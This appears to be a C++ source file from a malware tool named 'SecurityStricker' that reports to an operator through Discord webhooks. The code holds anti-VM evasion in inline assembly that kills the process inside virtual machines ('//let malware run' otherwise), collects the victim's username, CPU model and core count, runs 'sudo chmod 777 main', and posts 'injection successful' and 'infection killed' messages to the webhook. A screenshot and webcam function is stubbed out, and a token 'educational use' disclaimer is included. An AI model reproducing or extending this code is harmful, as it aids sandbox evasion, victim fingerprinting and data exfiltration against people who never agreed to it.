#include "handling.h"

struct list_error {
    std::string no_found_cpu;
    std::string wrong_chmod;
};

struct system_specs {
    std::string cpu_model;
    std::string cpu_cores;
    std::string name;
};

list_error handled_err;
system_specs hardware_specs;

void detect_execution_enviroment() {
    bool virtualization_bios_extension = false;
    #ifdef PLATFORM_WNDOWS_32x64
        DWORD procId = GetCurrentProcessId();
        __asm {
            mov eax, 'VMXh'
            mov edx, 0
            mov ecx, 0x00000001
            mov edx, 'VX'
            in eax, dx
            cmp ebx, 'VMXh'
            setz [virtualization_bios_extension]
        }

        DWORD is_window_vm_flagapi = false;
        if(IsWindowVirtualMachine(&is_window_vm_flagapi) != 0) {
            is_window_vm_flagapi = true;
        }

        if(virtualization_bios_extension == true && is_window_vm_flagapi == false) {
            //let malware run
        } else if(virtualization_bios_extension == false && is_window_vm_flagapi == true) {
             //let malware run
        } else if(virtualization_bios_extension == true && is_window_vm_flagapi == true) {
            TerminateProcess(procId, 0);
            return;
        }
    #else
        return;
    #endif
}

dpp::embed isnt_root() {
    char* system_username = getlogin();
    hardware_specs.name = std::string(system_username);
    std::string warning_issue = "```No root permissions.```";
    std::string warning_output = "```The system " + hardware_specs.name + " tryied to execute the program without root perms, aborted.```";
    dpp::embed no_root_privilege = dpp::embed()
        .set_color(dpp::colors::red_gold)
        .add_field("<:warningdisc:1129900021718982757> Warning", warning_issue, true)
        .add_field("<:blueshie:1127620004955836416> Output", warning_output, false)
        .set_color(dpp::colors::red)
        .set_footer(dpp::embed_footer()
            .set_text("@ferrnnaando : https://github.com/ferrnnaando")
            .set_icon("https://i.imgur.com/a8TdLHg.jpg")
        )
    ;

    return no_root_privilege;
}

dpp::embed disclaimer_warning() {
    std::string warning_disclaimer = "```@ferrnnaando Developer warning.```";
    std::string warning_output = "```SecurityStricker is intended for responsible and ethical use. Ensure that you have proper authorization before using this tool and adhere to legal regulations and ethical guidelines in your jurisdiction. This tool is provided for educational and ethical purposes only. The authors and contributors are not responsible for any misuse or illegal activities carried out with this software.```";
    dpp::embed disclaimer = dpp::embed()
        .set_color(dpp::colors::red_gold)
        .add_field("<:warningdisc:1129900021718982757> Warning", warning_disclaimer, true)
        .add_field("<:blueshie:1127620004955836416> Output", warning_output, false)
        .set_color(dpp::colors::yellow)
        .set_footer(dpp::embed_footer()
            .set_text("@ferrnnaando : https://github.com/ferrnnaando")
            .set_icon("https://i.imgur.com/a8TdLHg.jpg")
        )
    ;

    return disclaimer;
}

dpp::embed equal_webhooks() {
    std::string warning_error = "```Webhook.```";
    std::string warning_output_wh = "```You can't assign the same webhook url to 2 differents webhooks.```";
    dpp::embed equal_webhooks = dpp::embed()
        .set_color(dpp::colors::yellow)
        .add_field("<:warningdisc:1129900021718982757> Warning", warning_error, true)
        .add_field("<:blueshie:1127620004955836416> Process", warning_output_wh, true)
        .set_footer(dpp::embed_footer()
            .set_text("@ferrnnaando : https://github.com/ferrnnaando")
            .set_icon("https://i.imgur.com/a8TdLHg.jpg")
            )
    ;

    return equal_webhooks;
}

dpp::embed making_connection() {
    std::ifstream cpu_model("/proc/cpuinfo");
    std::string line_cpu;

    if(!cpu_model) {
        handled_err.no_found_cpu = "CPU Info wasnt found.";
    } else {
        while(std::getline(cpu_model, line_cpu)) {
            if(line_cpu.find("model name") != std::string::npos) {
                size_t delimiter = line_cpu.find(":");

                if(delimiter != std::string::npos) {
                    std::string cpu_string = line_cpu.substr(delimiter + 2);
                    hardware_specs.cpu_model = cpu_string;
                }
            }
        }
    }

    std::string exec = std::string(program_invocation_short_name);
    int chmod_result = system("sudo chmod 777 main");
    if(chmod_result == 0) {
        //success
    } else {
        handled_err.wrong_chmod = "There was an error giving chmod permissions";
    }

    hardware_specs.cpu_cores = std::to_string(std::thread::hardware_concurrency());
    std::string new_device = "```A new device found.```";
    std::string status = "```Loading... (Inyecting malware)```";

    dpp::embed connection = dpp::embed()
        .set_color(dpp::colors::yellow)
        .add_field("<:nofaceid:1129006938773016666> Status", new_device, true)
        .add_field("<:blueshie:1127620004955836416> Process", status, true)
        .set_footer(dpp::embed_footer()
            .set_text("@ferrnnaando : https://github.com/ferrnnaando")
            .set_icon("https://i.imgur.com/a8TdLHg.jpg")
        )
    ;

    return connection;
}

dpp::embed connection_result(bool& result) {
    std::string formated_error = "";
    if(result == false || !handled_err.no_found_cpu.empty() || !handled_err.wrong_chmod.empty()) {
    
        if (!handled_err.no_found_cpu.empty()) {
            formated_error += "WRONG -> cpu info (" + handled_err.no_found_cpu + ")\n";
        } 
        else {
            formated_error += "OK -> cpu info\n";
        }

        if (!handled_err.wrong_chmod.empty()) {
            formated_error += "WRONG -> chmod (" + handled_err.wrong_chmod + ")";
        } 
        else {
            formated_error += "OK -> chmod";
        }
        std::string result_wrong = "```Inyection was unsuccessful.```";
        dpp::embed wrong = dpp::embed()
            .set_color(dpp::colors::red_blood)
            .add_field("<:nofaceid:1129006938773016666> Status", result_wrong, false)
            .add_field("<:blueshie:1127620004955836416> Output", formated_error, false)
            .set_footer(dpp::embed_footer()
                .set_text("If everything appears as \"OK\" but results on unsuccessful should check the way of how the code is comprobating these and executing the code based on it.")
                .set_icon("https://i.imgur.com/a8TdLHg.jpg")
            )
        ;

        return wrong;
    } else {
        std::string result_success = "```Inyection was sucessful.```";
        std::string output_success = "```No errors.```";
        std::string sys_about = "```System device user: " + hardware_specs.name + "\nSystem:  \nCPU: " + hardware_specs.cpu_model + " || " + hardware_specs.cpu_cores + " cores.\nGPU: ```";

        dpp::embed success = dpp::embed()
            .set_color(dpp::colors::green)
            .add_field("<:nofaceid:1129006938773016666> Status", result_success, true)
            .add_field("<:blueshie:1127620004955836416> Output", output_success, true)
            .add_field("System", sys_about, false)
            .set_footer(dpp::embed_footer()
                .set_text("@ferrnnaando : https://github.com/ferrnnaando")
                .set_icon("https://i.imgur.com/a8TdLHg.jpg")
                )
        ;

        return success;
    }

    return dpp::embed();
}

dpp::embed handle_catch(const std::exception& e) {
    std::string status_error = "```A exception was catched by the try {} catch{} block.```";
    std::string excp = e.what();
    std::string formated_exception = "```" + excp + "```";
    dpp::embed success = dpp::embed()
        .set_color(dpp::colors::green)
        .add_field("<:nofaceid:1129006938773016666> Status", status_error, true)
        .add_field("<:blueshie:1127620004955836416> Output", formated_exception, true)
        ;

        return success;
}

void take_screenshot(const int& interval_screenshot, const int& interval_webcamshot) {
     

}

dpp::embed handle_kill() {
    std::string status_error = "```Terminated.```";
    std::string formated_exception = "```The " + hardware_specs.name + " system infection got killed by the system.```";
    dpp::embed success = dpp::embed()
        .set_color(dpp::colors::red)
        .add_field("<:nofaceid:1129006938773016666> Status", status_error, true)
        .add_field("<:blueshie:1127620004955836416> Output", formated_exception, true)
         .set_footer(dpp::embed_footer()
            .set_text("@ferrnnaando : https://github.com/ferrnnaando")
            .set_icon("https://i.imgur.com/a8TdLHg.jpg")
            )
        ;

        return success;
}

void track_kill(dpp::cluster& temp_token, dpp::webhook& MAIN_WEBHOOK) {
    dpp::message proc_kill("");
    proc_kill.add_embed(handle_kill());
    std::this_thread::sleep_for(std::chrono::seconds(1));
    temp_token.execute_webhook(MAIN_WEBHOOK, proc_kill);
}